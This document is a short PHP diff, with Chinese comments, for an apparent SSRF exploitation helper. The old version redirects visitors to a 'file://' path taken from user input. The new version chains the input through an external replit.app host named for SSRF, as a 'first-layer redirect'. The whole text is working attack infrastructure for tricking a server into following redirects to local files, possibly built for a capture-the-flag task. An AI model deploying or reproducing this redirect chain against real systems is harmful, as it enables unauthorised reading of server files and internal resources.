@@ -1,4 +1,5 @@
 <?php
-// 在replit.com创建新的PHP repl
-header('location:file://'.$_GET['url']);
+// 第一层重定向
+$url = $_REQUEST['url'];
+header('Location: https://ssrf-pjwaurora0808.replit.app/final.php?path=' . urlencode($url));
 ?>
